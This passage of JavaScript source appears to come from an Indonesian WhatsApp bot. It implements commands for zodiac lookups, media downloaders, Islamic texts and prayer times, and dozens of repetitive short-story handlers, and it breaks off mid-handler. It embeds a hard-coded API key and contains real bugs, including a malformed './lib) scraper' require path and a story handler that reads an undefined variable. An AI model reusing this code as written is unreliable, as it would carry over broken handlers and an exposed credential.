                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                dica.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
//━━━━━━━━━━━━━━━[ BATAS ]━━━━━━━━━━━━━━━━━//
case 'darkjokes': case 'mountain': case 'meme': case 'aestatic': case 'art': case 'boneka': case 'cyber': case 'doraemon': case 'exo': case 'wallpapergame': case 'islamic': case 'kartun': case 'katakata': case 'kpop': case 'mobil': case 'motor': case 'pokemon': case 'programming': case 'pubg': case 'quotesyt': case 'stanic': case 'tatasurya': case 'technology': case 'wallhp': case 'wallml': case 'wallnime': case 'yulibocil': 
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var darkjokes = JSON.parse(fs.readFileSync(`./storage/wallpaper/${command}.json`))
var hasil = pickRandom(darkjokes)
dica.sendMessage(m.chat, { caption: mess.success, image: { url: hasil }, buttons: but, footer: mess.watermark }, { quoted: m })
break
//ANJAY ALOK//
            case 'joox': case 'jooxdl': {
                if (!text) throw 'No Query Title'
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'f22b3c4c2c'))
                let msg = await dica.sendImage(m.chat, anu.result.img, `• Title : ${anu.result.lagu}\n• Album : ${anu.result.album}\n• Singer : ${anu.result.penyanyi}\n• Publish : ${anu.result.publish}\n• Lirik :\n${anu.result.lirik.result}`, m)
                dica.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!text) throw 'No Query Title'
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'f22b3c4c2c'))
                let msg = await dica.sendImage(m.chat, anu.result.thumb, `• Title : ${anu.result.title}\n• Url : ${isUrl(text)[0]}`)
                dica.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'f22b3c4c2c'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                dica.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'f22b3c4c2c'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await dica.sendMessage(m.chat, buttonMessage, { quoted: m })
                dica.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'f22b3c4c2c'))
                dica.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `• Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pinterest': {
m.reply(mess.wait)
let { pinterest } = require('./lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
dica.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Contoh : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
• Title : ${anu.title}
• Author : ${anu.author.name}
• Like : ${anu.like}
• Caption : ${anu.caption}
• Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: dica.user.name,
			buttons,
			headerType: 4
		    }
		    dica.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        dica.sendMessage(m.chat, { image: { url }, caption: `• Title : ${anu.title}\n• Author : ${anu.author.name}\n• Like : ${anu.like}\n• Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Contoh : ${prefix + command} black rover`
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		dica.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
//INI FITUR ISLAMI KEK NYA WORK SEMUA\nKalo Eror Fix Sendiri ya teman wk//
				case 'iqra': {
		oh = `Contoh : ${prefix + command} 3\n\nIQRA Which Is Available : 1,2,3,4,5,6`
		if (!text) return m.reply(oh)
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		dica.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
case 'hadits': case 'hadis': case 'hadist': {
if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
tirmidzi
1 - 3891
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
try {
let res = await fetchJson(`https://fatiharridho.herokuapp.com/api/islamic/hadits?list=${args[0]}`)
let { number, arab, id } = res.result.find(v => v.number == args[1])
m.reply(`No. ${number}

${arab}

${id}`)
} catch (e) {
m.reply(`Hadis tidak ditemukan !`)
}
}
break
case 'alquran': {
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
m.reply(txt)
dica.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tafsirsurah': {
		if (!args[0]) return reply(`Usage Contohs:\n${prefix + command} 1 2\n\nThen The Result Is The Interpretation Of Surah Al-Fatihah Verse 2`)
		if (!args[1]) return reply(`Usage Contohs:\n${prefix + command} 1 2\n\nThen The Result Is The Interpretation Of Surah Al-Fatihah Verse 2`)
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Short* : ${res.result.data.tafsir.id.short}

*Long* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
case 'kisahnabi': {
if (!text) return m.reply(`Mau Kisah Nabi Siapa?\n\nList Nama Nabi :\n1. adam\n2. idris\n3. nuh\n4. hud\n5. saleh\n6. ibrahim\n7. luth\n8. ismail\n9. ishaq\n10. yaqub\n11. yusuf\n12. ayub\n13. syuaib\n14. musa\n15. harun\n16. dzulkifli\n17. daud\n18. sulaiman\n19. ilyas\n20. ilyasa\n21. yunus\n22. zakaria\n23. yahya\n24. musa\n25. muhammad\n\nContoh: ${prefix+command} Muhammad`)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var tipe = (args[0] || '').toLowerCase()
switch (tipe) {
case 'adam': case 'idris': case 'nuh': case 'hud': case 'saleh': case 'ibrahim': case 'luth': case 'ismail': case 'ishaq': case 'yaqub': case 'yusuf': case 'ayub': case 'syuaib': case 'musa': case 'harun': case 'dzulkifli': case 'daud': case 'sulaiman': case 'ilyas': case 'ilyasa': case 'yunus': case 'zakaria': case 'yahya': case 'musa': case 'muhammad': 
m.reply(mess.wait)
let kisah = await fetchJson(`https://raw.githubusercontent.com/NzrlAfndi/Databasee/main/Islami/${text}.json`)
resNabi = `Kisah Nabi ${text}

❏ *Nama* : ${kisah.name}
❏ *Kelahiran* : ${kisah.thn_kelahiran}
❏ *Usia* : ${kisah.usia}
❏ *Tempat* : ${kisah.tmp}
❏ *Cerita* : ${kisah.description}
`
dica.sendMessage(m.chat, { image: { url: `${kisah.image_url}` }, caption: resNabi }, { quoted: m })
 }
}
break
case 'niatsolat': {
if (!text) return m.reply(`Mau Niat Solat Apa?\n\nList Niat Solat :\n1. subuh\n2. dzuhur\n3. ashar\n4. maghrib\n5. isya\n\nContoh: ${prefix+command} subuh`)
var tipe = (args[0] || '').toLowerCase()
switch (tipe) {
case 'subuh': case 'dzuhur': case 'ashar': case 'maghrib': case 'isya':
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
m.reply(mess.wait)
let niat = await fetchJson(`https://raw.githubusercontent.com/NzrlAfndi/Databasee/main/Niatsolat/${text}.json`)
let resniat = `Niat Solat ${text}
  
❏ *Nama* : ${niat.name}
❏ *Arabic* : ${niat.arabic}
❏ *Latin* : ${niat.latin}
❏ *Indonesia* : ${niat.terjemahan}
`
m.reply(resniat)
 }
}
break
case 'asmaulhusna': {
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/religi/asmaulhusna.json')
let capt = `Asmaul Husna:\n\n`
for (let i of anu) {
capt += `❏ *Nomor*: ${i.index}\n`
capt += `❏ *Latin*: ${i.latin}\n`
capt += `❏ *Arab*: ${i.arabic}\n`
capt += `❏ *Arti ID*: ${i.translation_id}\n`
capt += `❏ *Arti EN*: ${i.translation_en}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n`
}
m.reply(capt)
}
break
case 'jadwalsholat':
case 'jadwalshalat':
case 'jadwalsalat': {
if (!text) throw `Contoh : ${prefix + command} Padang`
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let res = await dani.jadwalsholat(text)  
let capt = `Jadwal Sholat Kota : ${text}\n\n`
let i = res
capt += `Tanggal : ${i.tanggal}\n`
capt += `Imsak : ${i.imsyak}\n`
capt += `Subuh : ${i.subuh}\n`
capt += `Dzuhur : ${i.dzuhur}\n`
capt += `Ashar : ${i.ashar}\n`
capt += `Maghrib : ${i.maghrib}\n`
capt += `Isya : ${i.isya}\n\n`
m.reply(capt)
}
break
case 'ceramah': {
if (!text) return m.reply(`Mau Ceramah Dari Siapa?\n\nList Ustadz :\n1. abdulsomad\n2. adihidayat\n3. felixsiauw\n4. khalidbasalamah\n\nContoh: ${prefix+command} abdulsomad`)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
var tipe = (args[0] || '').toLowerCase()
switch (tipe) {
case 'abdulsomad': case 'adihidayat': case 'felixsiauw': case 'khalidbasalamah': 
m.reply(mess.wait)
let ceramah = await fetchJson(`https://raw.githubusercontent.com/NzrlAfndi/Databasee/main/Ceramah/${text}.json`)
let rescera = `Ceramah Dari *${ceramah.name}*

${ceramah.ceramah}`
m.reply(rescera)
}
}
break
//SELESAI//
//━━━━━━━━━━━━━━━[ RANDOM CERPEN ]━━━━━━━━━━━━━━━━━//
case 'cerpen-anak':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`anak`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`bahasa daerah`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasainggris':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`bahasa Inggris`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasajawa':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`bahasa jawa`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasasunda':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`bahasa sunda`)
m.reply(`
 ❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-budaya':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`budaya`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cinta':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`cinta`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintaislami':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`cinta islami`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintapertama':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`cinta pertama`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintaromantis':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`cinta romantis`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasedih':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`cinta sedih`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`Cinta segitiga`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasejati':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`cinta sejati`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-galau':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`galau`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-gokil':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`gokil`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-inspiratif':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`inspiratif`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-jepang':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`jepang`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kehidupan':{
let hasil = await cerpen(`kehidupan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-keluarga':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`keluarga`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kisahnyata':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`kisah nyata`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-korea':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`korea`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kristen':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`kristen`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-liburan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`liburan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-malaysia':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`malaysia`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-mengharukan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`mengharukan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-misteri':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`misteri`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-motivasi':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`motivasi`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-nasihat':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`nasihat`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-nasionalisme':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`nasionalisme`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-olahraga':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`olahraga`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-patahhati':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let cerpe = await cerpen(`patah hati`)
reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-penantian':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`penantian`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pendidikan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`pendidikan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pengalaman':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`pengalaman pribadi`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pengorbanan':{
	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
let hasil = await cerpen(`pengorbanan`)
m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
